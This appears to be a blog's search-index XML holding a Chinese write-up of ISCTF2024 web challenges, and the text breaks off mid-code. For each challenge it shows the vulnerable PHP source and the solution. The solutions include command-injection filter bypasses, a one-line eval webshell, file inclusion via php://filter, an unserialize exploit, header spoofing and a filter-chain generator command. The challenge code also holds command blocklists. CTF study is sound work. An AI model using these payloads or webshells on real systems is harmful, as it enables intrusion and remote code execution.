<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ISCTF2024_WEB复现</title>
    <link href="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><br><span class="hljs-comment">#一句话木马，神神又奇奇</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$call</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br>    <span class="hljs-variable">$dangerous_commands</span> = [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;tac&#x27;</span>, <span class="hljs-string">&#x27;head&#x27;</span>, <span class="hljs-string">&#x27;nl&#x27;</span>, <span class="hljs-string">&#x27;more&#x27;</span>, <span class="hljs-string">&#x27;less&#x27;</span>, <span class="hljs-string">&#x27;tail&#x27;</span>, <span class="hljs-string">&#x27;vi&#x27;</span>, <span class="hljs-string">&#x27;sed&#x27;</span>, <span class="hljs-string">&#x27;od&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dangerous_commands</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$command</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$command</span>/i&quot;</span>, <span class="hljs-variable">$call</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;这些个危险函数可不兴使啊&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$call</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>题目过滤了一些读文件的命令</p><p>先ls &#x2F;，发现&#x2F;f14g目录</p><p>拿flag的话，这里就直接贴一些payload</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">J=ca&#x27;&#x27;t /f14g</span><br><span class="language-xml"></span><br><span class="language-xml">J=strings /f14g</span><br><span class="language-xml"></span><br><span class="language-xml">J=tar -czf flag.tar.gz /f14g# 将/f14g文件打包为flag.tar.gz文件，访问下载即可</span><br><span class="language-xml"></span><br><span class="language-xml">J=cp /f14g flag.txt</span><br><span class="language-xml"></span><br><span class="language-xml">J=echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; 1.php# 题目提示的写马</span><br><span class="language-xml"></span><br><span class="language-xml">······</span><br></code></pre></td></tr></table></figure><h2 id="25时晓山瑞希生日会"><a href="#25时晓山瑞希生日会" class="headerlink" title="25时晓山瑞希生日会"></a>25时晓山瑞希生日会</h2><p>bp抓包</p><p>1、“你不是烤p！要是Project Sekai的客户端请求才能加入生日会” &#x3D;&#x3D;&gt; 把ua头改为“Project Sekai”</p><p>2、“只能从本地来！” &#x3D;&#x3D;&gt; 加一个xff头“X-Forwarded-For: 127.0.0.1”</p><p>3、“你似乎没在正确的时间来…”</p><p>加一个Date头，先随便加一个时间，提示“日期格式不对哦，要RFC 822格式”</p><blockquote><p>RFC 822格式时间是一种标志化的时间表示方法，常用于电子邮件和互联网协议中，它的格式为：Day, DD Mon YYYY HH:MM:SS GMT，例如：Mon, 30 Nov 2020 01:07:30 GMT</p></blockquote><p>按照格式修改Date头的值，提示太早了</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/251.png"></p><p>检索一下“25时晓山瑞希生日会”，发现时间“2024年8月27日”，修改Date头，拿到flag</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/252.png"></p><h2 id="UP-UPloader"><a href="#UP-UPloader" class="headerlink" title="UP!UPloader"></a>UP!UPloader</h2><p>先随便传一个文件，提示include.php</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/up1.png"></p><p>访问include.php，提示文件包含，尝试用伪协议读出upload.php</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload.php</p></blockquote><p>解码后，得到upload.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_FILENAME);<br>    <span class="hljs-variable">$dir_name</span> = <span class="hljs-variable">$name</span> . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-variable">$upload_dir</span> = <span class="hljs-string">&#x27;./uploads/&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$upload_dir</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$upload_dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$upload_dir</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$dir_name</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$ext</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传成功！不过文件路径可不好找呀~什么？什么include.php？我不知道啊。&quot;</span> ;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件存储失败，未知原因......&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>文件上传后被放在&#x2F;uploads目录下，且文件被保存为md5(原文件名.拓展名)+拓展名</p><p>上传1.php，其中写入一句话木马，上传后1.php被保存为f3b94e88bd1bd325af6f62828c8785dd.php，然后连马，拿flag，flag在环境变量中</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|cat|ls|echo|php|bash|sh|more| |less|head|tail|[\|\&amp;\&gt;\&lt;]|eval|system|exec|popen|shell_exec/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Blocked by security filter!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了一些命令和函数，直接贴一些payload吧</p><blockquote><p>cmd&#x3D;passthru(‘ca\t${IFS}&#x2F;f*’);</p><p>cmd&#x3D;passthru(‘strings${IFS}&#x2F;f*’);</p><p>cmd&#x3D;include$_GET[‘a’];&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag</p><p>cmd&#x3D;(sy.(st).em)(hex2bin(‘636174202f662a’));</p><p>······</p></blockquote><h2 id="ezSSTI"><a href="#ezSSTI" class="headerlink" title="ezSSTI"></a>ezSSTI</h2><p>fenjing一把梭</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/ezssti.png"></p><h2 id="ezserialize"><a href="#ezserialize" class="headerlink" title="ezserialize"></a>ezserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;flag;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You can&#x27;t directly access the flag!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isAdmin</span> = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;isAdmin) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome, admin! Here&#x27;s your flag: &quot;</span> . (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>())-&gt;<span class="hljs-title function_ invoke__">getFlag</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello, &quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$this</span>-&gt;username) . <span class="hljs-string">&quot;!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><br>    <span class="hljs-variable">$object</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> <span class="hljs-keyword">instanceof</span> User) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$object</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Invalid object!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>反序列化触发User类中的__wakeup()魔术方法，打印出flag</p><p>序列化exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isAdmin</span> = True;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="千年樱"><a href="#千年樱" class="headerlink" title="千年樱"></a>千年樱</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dir.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;proof of work&lt;br&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;from&#x27;</span>] === <span class="hljs-string">&quot;ISCTF&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir1</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;what? so where are you from?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// &lt;!-- do you want to learn more?  goto story.txt --&gt;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>添加一个cookie</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/qyh1.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dir.php&quot;</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-string">&#x27;ISCTF&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir2</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Wrong!&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>data伪协议写入</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/qyh2.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dir.php&quot;</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|php|file|:|=|\/|\?/i&quot;</span>, <span class="hljs-variable">$str</span>) )&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad hacker!!!&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$poc</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;poc&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$poc</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;php://filter/<span class="hljs-subst">$poc</span>/resource=/var/www/html/badChar.txt&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> === <span class="hljs-string">&quot;sakura for ISCTF&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yes! master!&quot;</span>;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;output&#x27;</span>] == <span class="hljs-number">114514</span> &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;output&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这里用php:&#x2F;&#x2F;filter链构造字符加strips_tags截断，然后rce拿flag</p><p>用php_filter_chain_generator构造filter链</p><blockquote><p>python php_filter_chain_generator.py –chain sakura for ISCTF&lt;?php</p></blockquote><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/qyh3.png"></p><h2 id="天命人"><a href="#天命人" class="headerlink" title="天命人"></a>天命人</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-number">1</span>.jpeg<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment"># 帮天命人搜集法宝，重获齐天之姿！</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Wuzhishan</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$wu</span>=<span class="hljs-string">&quot;俺老孙定要踏破这五指山！&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zhi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shan</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$j</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$yin</span>=<span class="hljs-string">&quot;s214587387a&quot;</span>;<br>        <span class="hljs-variable">$yang</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$yin</span>)==<span class="hljs-variable">$yang</span>&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$yin</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$yang</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;哦？又一个不信天命之人？行了，拿了东西速速离开吧&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Huoyanjinjing</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$huoyan</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jinjing</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$huo</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;huoyan=<span class="hljs-string">&quot;火眼能洞察一切邪祟！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;huoyan-&gt;jinjing;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;jinjing=<span class="hljs-string">&quot;金睛能看破世间迷惘！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;huoyan-&gt;jinjing;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dinghaishenzhen</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Jindou</span>=<span class="hljs-string">&quot;一个筋斗能翻十万八千里！&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yun</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$f</span>=<span class="hljs-variable language_">$this</span>-&gt;yun;<br>        <span class="hljs-variable">$f</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;你真的逃出去了吗？天命人？&lt;br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jingdouyun</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Qishier</span>=<span class="hljs-number">72</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bian</span>=<span class="hljs-string">&quot;看俺老孙七十二变！&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;三更敲门，菩提老祖送我筋斗云...&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jindouyun</span>();<br>    